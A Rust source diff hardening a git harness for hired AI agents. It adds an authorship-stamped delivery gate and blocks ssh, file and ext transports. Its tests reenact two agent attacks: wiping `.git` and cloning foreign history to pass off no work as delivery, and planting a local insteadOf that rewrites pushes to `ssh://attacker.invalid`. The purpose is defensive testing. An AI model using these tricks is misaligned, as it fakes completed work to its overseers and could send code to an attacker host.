@@ -9,6 +9,10 @@
 //! `url.*.insteadOf` is neutralized HOME-independently: empty `GIT_CONFIG_GLOBAL`,
 //! `GIT_CONFIG_NOSYSTEM=1`, and a dedicated empty `XDG_CONFIG_HOME` so neither the
 //! operator XDG config nor a poisoned `$seller/.gitconfig` can rewrite HTTPS→SSH.
+//!
+//! Local workdir `.git/config` insteadOf (agent-planted) is beaten by `-c
+//! protocol.ssh/file/ext.allow=never` on every scrubbed invocation — highest precedence,
+//! so allowlisted https strings cannot be rewritten onto banned transports.
 
 use std::ffi::OsStr;
 use std::path::{Path, PathBuf};
@@ -49,22 +53,99 @@ impl From<TransportRefuse> for SellerGitError {
 
 /// Best-effort `HEAD` OID in `workdir`. `None` when the tree has no commits yet.
 ///
-/// Used by gate #10 (delivery attribution): deliver only if the agent advanced `HEAD`.
+/// Used by gate #10 (delivery attribution): deliver only agent-authored, non-empty trees.
 pub fn try_head_oid(workdir: &Path, seller_home: &Path) -> Option<String> {
-    let rev = scrubbed_git(workdir, seller_home, ["rev-parse", "HEAD"]).ok()?;
-    if !rev.status.success() {
+    rev_parse_oid(workdir, seller_home, "HEAD")
+}
+
+fn rev_parse_oid(workdir: &Path, seller_home: &Path, rev: &str) -> Option<String> {
+    let out = scrubbed_git(workdir, seller_home, ["rev-parse", rev]).ok()?;
+    if !out.status.success() {
         return None;
     }
-    let oid = String::from_utf8_lossy(&rev.stdout).trim().to_owned();
+    let oid = String::from_utf8_lossy(&out.stdout).trim().to_owned();
     if oid.len() < 40 || !oid.chars().all(|c| c.is_ascii_hexdigit()) {
         return None;
     }
     Some(oid.to_ascii_lowercase())
 }
 
-/// Gate #10: refuse deliver unless agent advanced `HEAD` (never harness-authored fallback).
-pub fn require_agent_advanced_head(
-    before: Option<&str>,
+/// Stamped identity for empty-base deliveries (agent-from-empty model).
+///
+/// Gate #10 accepts only commits whose author **and** committer match this stamp.
+/// Clone-then-no-work keeps the remote's original authors → refuse.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct DeliveryAgentIdentity {
+    pub name: String,
+    pub email: String,
+}
+
+impl DeliveryAgentIdentity {
+    /// Derive a stable seller-run identity from the seller pubkey hex.
+    pub fn for_seller(seller_pubkey_hex: &str) -> Self {
+        let short = seller_pubkey_hex
+            .get(..16)
+            .unwrap_or(seller_pubkey_hex)
+            .to_ascii_lowercase();
+        Self {
+            name: format!("mobee-seller-{short}"),
+            email: format!("{short}@seller.mobee.invalid"),
+        }
+    }
+
+    /// Env that overrides ambient git identity for commits made during the agent run.
+    pub fn git_env(&self) -> Vec<(String, String)> {
+        vec![
+            ("GIT_AUTHOR_NAME".into(), self.name.clone()),
+            ("GIT_AUTHOR_EMAIL".into(), self.email.clone()),
+            ("GIT_COMMITTER_NAME".into(), self.name.clone()),
+            ("GIT_COMMITTER_EMAIL".into(), self.email.clone()),
+        ]
+    }
+}
+
+/// Empty-base setup: `git init` + stamp local identity. **No harness commit.**
+///
+/// Pre-init also makes naive `git clone <url> .` fail (workdir is non-empty), so the
+/// clone-only exploit must wipe `.git` first — after which authorship still refuses.
+pub fn init_empty_delivery_workdir(
+    workdir: &Path,
+    seller_home: &Path,
+    identity: &DeliveryAgentIdentity,
+) -> Result<(), SellerGitError> {
+    if !workdir.exists() {
+        std::fs::create_dir_all(workdir).map_err(|error| SellerGitError::Io(error.to_string()))?;
+    }
+    let init = scrubbed_git(workdir, seller_home, ["init", "--initial-branch=main"])?;
+    if !init.status.success() {
+        return Err(SellerGitError::CommandFailed("init"));
+    }
+    run_ok(
+        "config-user-name",
+        scrubbed_git(workdir, seller_home, ["config", "user.name", &identity.name])?,
+    )?;
+    run_ok(
+        "config-user-email",
+        scrubbed_git(
+            workdir,
+            seller_home,
+            ["config", "user.email", &identity.email],
+        )?,
+    )?;
+    Ok(())
+}
+
+/// Gate #10 (empty-base): deliver IFF HEAD is agent-authored + substantive.
+///
+/// - `after` missing → refuse (no harness fallback)
+/// - any commit author/committer ≠ stamped identity → refuse (clone-only / foreign history)
+/// - HEAD tree == empty tree → refuse (empty/no-op commit)
+///
+/// Does **not** require a pre-agent `before` OID — empty workdirs are the product model.
+pub fn require_agent_authored_delivery(
+    workdir: &Path,
+    seller_home: &Path,
+    identity: &DeliveryAgentIdentity,
     after: Option<&str>,
 ) -> Result<String, SellerGitError> {
     let after = after.ok_or_else(|| {
@@ -72,15 +153,79 @@ pub fn require_agent_advanced_head(
             "delivery refused: agent left no commit (HEAD missing) — no harness fallback".into(),
         )
     })?;
-    if let Some(before) = before {
-        if before.eq_ignore_ascii_case(after) {
-            return Err(SellerGitError::Io(
-                "delivery refused: HEAD did not advance after agent run (no harness fallback)"
-                    .into(),
-            ));
+    require_all_commits_agent_authored(workdir, seller_home, identity)?;
+    require_head_tree_nonempty(workdir, seller_home, after)?;
+    Ok(after.to_owned())
+}
+
+fn require_all_commits_agent_authored(
+    workdir: &Path,
+    seller_home: &Path,
+    identity: &DeliveryAgentIdentity,
+) -> Result<(), SellerGitError> {
+    // %x1f field sep / %x1e record sep — every commit must match the stamp.
+    let out = scrubbed_git(
+        workdir,
+        seller_home,
+        ["log", "--format=%an%x1f%ae%x1f%cn%x1f%ce%x1e", "HEAD"],
+    )?;
+    if !out.status.success() {
+        return Err(SellerGitError::Io(
+            "delivery refused: cannot read commit authors — fail-closed (no harness fallback)"
+                .into(),
+        ));
+    }
+    let text = String::from_utf8_lossy(&out.stdout);
+    let mut saw_commit = false;
+    for record in text.split('\u{1e}') {
+        let record = record.trim();
+        if record.is_empty() {
+            continue;
+        }
+        saw_commit = true;
+        let mut fields = record.split('\u{1f}');
+        let an = fields.next().unwrap_or("");
+        let ae = fields.next().unwrap_or("");
+        let cn = fields.next().unwrap_or("");
+        let ce = fields.next().unwrap_or("");
+        if an != identity.name
+            || ae != identity.email
+            || cn != identity.name
+            || ce != identity.email
+        {
+            return Err(SellerGitError::Io(format!(
+                "delivery refused: commit not agent-authored (author={an} <{ae}>, committer={cn} <{ce}>; expected {} <{}>) — clone-only / foreign history",
+                identity.name, identity.email
+            )));
         }
     }
-    Ok(after.to_owned())
+    if !saw_commit {
+        return Err(SellerGitError::Io(
+            "delivery refused: agent left no commit (HEAD missing) — no harness fallback".into(),
+        ));
+    }
+    Ok(())
+}
+
+fn require_head_tree_nonempty(
+    workdir: &Path,
+    seller_home: &Path,
+    after: &str,
+) -> Result<(), SellerGitError> {
+    // Prefer ls-tree over a hardcoded empty-tree OID — hash algo / git builds vary.
+    let out = scrubbed_git(workdir, seller_home, ["ls-tree", "-r", "--name-only", after])?;
+    if !out.status.success() {
+        return Err(SellerGitError::Io(
+            "delivery refused: delivery tree unknown — fail-closed (no harness fallback)".into(),
+        ));
+    }
+    let listing = String::from_utf8_lossy(&out.stdout);
+    if listing.trim().is_empty() {
+        return Err(SellerGitError::Io(
+            "delivery refused: empty tree (no substantive files) — no harness fallback".into(),
+        ));
+    }
+    Ok(())
 }
 
 /// Push `branch` from `workdir` to `remote_url` (allowlisted https / relay-git only).
@@ -172,7 +317,17 @@ where
     S: AsRef<OsStr>,
 {
     let mut cmd = Command::new("git");
+    // `-c` flags must precede the subcommand and beat local `.git/config` insteadOf
+    // rewrites (agent-planted url.*.insteadOf → ssh/file/ext). Keep https + relay-git.
     cmd.current_dir(workdir)
+        .args([
+            "-c",
+            "protocol.ssh.allow=never",
+            "-c",
+            "protocol.file.allow=never",
+            "-c",
+            "protocol.ext.allow=never",
+        ])
         .args(args)
         .stdin(Stdio::null())
         .stdout(Stdio::piped())
@@ -321,17 +476,179 @@ mod tests {
     }
 
     #[test]
-    fn gate10_refuses_unchanged_head_and_missing_after() {
-        let oid = "a".repeat(40);
-        let err = require_agent_advanced_head(Some(&oid), Some(&oid)).expect_err("same head");
-        assert!(err.to_string().contains("did not advance"), "{err}");
-        let err = require_agent_advanced_head(Some(&oid), None).expect_err("missing after");
+    fn gate10_missing_after_refuses() {
+        let pk = "abcd".repeat(8);
+        let identity = DeliveryAgentIdentity::for_seller(&pk);
+        let err = require_agent_authored_delivery(
+            Path::new("/tmp/unused-gate10"),
+            Path::new("/tmp/unused-gate10-home"),
+            &identity,
+            None,
+        )
+        .expect_err("missing after");
         assert!(err.to_string().contains("no commit"), "{err}");
-        let advanced = "b".repeat(40);
-        let ok = require_agent_advanced_head(Some(&oid), Some(&advanced)).expect("advanced");
-        assert_eq!(ok, advanced);
-        let first = require_agent_advanced_head(None, Some(&advanced)).expect("first commit");
-        assert_eq!(first, advanced);
+    }
+
+    #[test]
+    fn gate10_wired_clone_then_no_work_refuses() {
+        // (a) Real workdir path: wipe stamped base, clone foreign repo, zero work → REFUSE.
+        let workdir = temp("gate10-clone-noop");
+        let home = temp("gate10-clone-noop-home");
+        let foreign = temp("gate10-foreign-src");
+        let _ = fs::remove_dir_all(&workdir);
+        let _ = fs::remove_dir_all(&home);
+        let _ = fs::remove_dir_all(&foreign);
+        fs::create_dir_all(&home).expect("home");
+
+        let pk = "11".repeat(32);
+        let identity = DeliveryAgentIdentity::for_seller(&pk);
+        init_empty_delivery_workdir(&workdir, &home, &identity).expect("stamp init");
+
+        // Foreign repo with non-agent authors (the clone-only payload).
+        fs::create_dir_all(&foreign).expect("foreign mkdir");
+        assert!(
+            Command::new("git")
+                .args(["init", "--initial-branch=main"])
+                .current_dir(&foreign)
+                .status()
+                .unwrap()
+                .success()
+        );
+        let _ = Command::new("git")
+            .args(["config", "user.name", "Upstream Author"])
+            .current_dir(&foreign)
+            .status();
+        let _ = Command::new("git")
+            .args(["config", "user.email", "upstream@example.invalid"])
+            .current_dir(&foreign)
+            .status();
+        fs::write(foreign.join("payload.txt"), "unchanged upstream tree\n").expect("write");
+        assert!(
+            Command::new("git")
+                .args(["add", "payload.txt"])
+                .current_dir(&foreign)
+                .status()
+                .unwrap()
+                .success()
+        );
+        assert!(
+            Command::new("git")
+                .args(["commit", "-m", "upstream"])
+                .current_dir(&foreign)
+                .status()
+                .unwrap()
+                .success()
+        );
+
+        // Exploit: wipe stamped .git and clone foreign history into the job workdir.
+        let _ = fs::remove_dir_all(workdir.join(".git"));
+        assert!(
+            Command::new("git")
+                .args(["clone", "--", foreign.to_str().expect("utf8"), "."])
+                .current_dir(&workdir)
+                .status()
+                .unwrap()
+                .success()
+        );
+
+        let after = try_head_oid(&workdir, &home).expect("clone left a HEAD");
+        let err = require_agent_authored_delivery(&workdir, &home, &identity, Some(&after))
+            .expect_err("clone-then-no-work must refuse");
+        assert!(
+            err.to_string().contains("not agent-authored")
+                || err.to_string().contains("foreign"),
+            "expected authorship refuse, got: {err}"
+        );
+
+        let _ = fs::remove_dir_all(&workdir);
+        let _ = fs::remove_dir_all(&home);
+        let _ = fs::remove_dir_all(&foreign);
+    }
+
+    #[test]
+    fn gate10_wired_agent_authored_nonempty_accepts() {
+        // (b) Legit empty-base agent work under the stamp → ACCEPT.
+        let workdir = temp("gate10-ok");
+        let home = temp("gate10-ok-home");
+        let _ = fs::remove_dir_all(&workdir);
+        let _ = fs::remove_dir_all(&home);
+        fs::create_dir_all(&home).expect("home");
+
+        let pk = "22".repeat(32);
+        let identity = DeliveryAgentIdentity::for_seller(&pk);
+        init_empty_delivery_workdir(&workdir, &home, &identity).expect("stamp init");
+        // Empty base: no HEAD yet.
+        assert!(try_head_oid(&workdir, &home).is_none());
+
+        fs::write(workdir.join("out.txt"), "agent did the work\n").expect("write");
+        assert!(
+            Command::new("git")
+                .args(["add", "out.txt"])
+                .current_dir(&workdir)
+                .env("GIT_AUTHOR_NAME", &identity.name)
+                .env("GIT_AUTHOR_EMAIL", &identity.email)
+                .env("GIT_COMMITTER_NAME", &identity.name)
+                .env("GIT_COMMITTER_EMAIL", &identity.email)
+                .status()
+                .unwrap()
+                .success()
+        );
+        assert!(
+            Command::new("git")
+                .args(["commit", "-m", "agent delivery"])
+                .current_dir(&workdir)
+                .env("GIT_AUTHOR_NAME", &identity.name)
+                .env("GIT_AUTHOR_EMAIL", &identity.email)
+                .env("GIT_COMMITTER_NAME", &identity.name)
+                .env("GIT_COMMITTER_EMAIL", &identity.email)
+                .status()
+                .unwrap()
+                .success()
+        );
+
+        let after = try_head_oid(&workdir, &home).expect("after");
+        let accepted =
+            require_agent_authored_delivery(&workdir, &home, &identity, Some(&after))
+                .expect("legit agent work must accept");
+        assert_eq!(accepted, after);
+
+        let _ = fs::remove_dir_all(&workdir);
+        let _ = fs::remove_dir_all(&home);
+    }
+
+    #[test]
+    fn gate10_wired_empty_tree_refuses() {
+        let workdir = temp("gate10-empty-tree");
+        let home = temp("gate10-empty-tree-home");
+        let _ = fs::remove_dir_all(&workdir);
+        let _ = fs::remove_dir_all(&home);
+        fs::create_dir_all(&home).expect("home");
+
+        let pk = "33".repeat(32);
+        let identity = DeliveryAgentIdentity::for_seller(&pk);
+        init_empty_delivery_workdir(&workdir, &home, &identity).expect("stamp init");
+        assert!(
+            Command::new("git")
+                .args(["commit", "--allow-empty", "-m", "empty"])
+                .current_dir(&workdir)
+                .env("GIT_AUTHOR_NAME", &identity.name)
+                .env("GIT_AUTHOR_EMAIL", &identity.email)
+                .env("GIT_COMMITTER_NAME", &identity.name)
+                .env("GIT_COMMITTER_EMAIL", &identity.email)
+                .status()
+                .unwrap()
+                .success()
+        );
+        let after = try_head_oid(&workdir, &home).expect("empty commit has HEAD");
+        let err = require_agent_authored_delivery(&workdir, &home, &identity, Some(&after))
+            .expect_err("empty tree must refuse");
+        assert!(
+            err.to_string().contains("empty tree"),
+            "expected empty-tree refuse, got: {err}"
+        );
+
+        let _ = fs::remove_dir_all(&workdir);
+        let _ = fs::remove_dir_all(&home);
     }
 
     #[test]
@@ -370,6 +687,76 @@ mod tests {
         assert!(
             !text.contains("poison.invalid"),
             "scrub leaked poisoned host into config list:\n{text}"
+        );
+
+        let _ = fs::remove_dir_all(&root);
+        let _ = fs::remove_dir_all(&home);
+    }
+
+    #[test]
+    fn push_refuses_agent_planted_local_insteadof_ssh() {
+        // Transport bypass: hired agent authors local `.git/config` insteadOf that
+        // rewrites allowlisted https → ssh. Allowlist sees the original https string;
+        // protocol.ssh.allow=never on scrubbed_git must still kill the rewritten push.
+        let root = temp("local-insteadof");
+        let home = temp("local-insteadof-home");
+        let _ = fs::remove_dir_all(&root);
+        let _ = fs::remove_dir_all(&home);
+        fs::create_dir_all(&home).expect("home");
+        init_repo(&root);
+
+        // Plant LOCAL insteadOf (survives global/XDG/system scrub).
+        let plant = Command::new("git")
+            .args([
+                "config",
+                "--local",
+                r#"url.ssh://attacker.invalid/.insteadOf"#,
+                "https://",
+            ])
+            .current_dir(&root)
+            .status()
+            .expect("plant local insteadOf");
+        assert!(plant.success(), "failed to plant local insteadOf");
+
+        // Without protocol lockdown this would attempt ssh://attacker… and hang/exfil.
+        let err = push_branch(
+            &root,
+            "https://example.invalid/git/owner/repo.git",
+            "main",
+            &home,
+        )
+        .expect_err("local insteadOf→ssh must not push");
+        match &err {
+            SellerGitError::AuthFailed(_) | SellerGitError::CommandFailed("push") => {}
+            other => panic!("expected push refuse after insteadOf→ssh, got: {other:?}"),
+        }
+
+        // Confirm scrubbed push stderr mentions protocol/ssh deny (not silent success).
+        let _ = scrubbed_git(
+            &root,
+            &home,
+            [
+                "remote",
+                "remove",
+                "origin",
+            ],
+        );
+        let _ = scrubbed_git(
+            &root,
+            &home,
+            [
+                "remote",
+                "add",
+                "origin",
+                "https://example.invalid/git/owner/repo.git",
+            ],
+        );
+        let push = scrubbed_git(&root, &home, ["push", "-u", "origin", "main"]).expect("spawn");
+        assert!(!push.status.success(), "scrubbed push must fail under insteadOf→ssh");
+        let stderr = String::from_utf8_lossy(&push.stderr).to_lowercase();
+        assert!(
+            stderr.contains("protocol") || stderr.contains("ssh") || stderr.contains("not allowed"),
+            "expected protocol.ssh deny in stderr, got:\n{stderr}"
         );
 
         let _ = fs::remove_dir_all(&root);
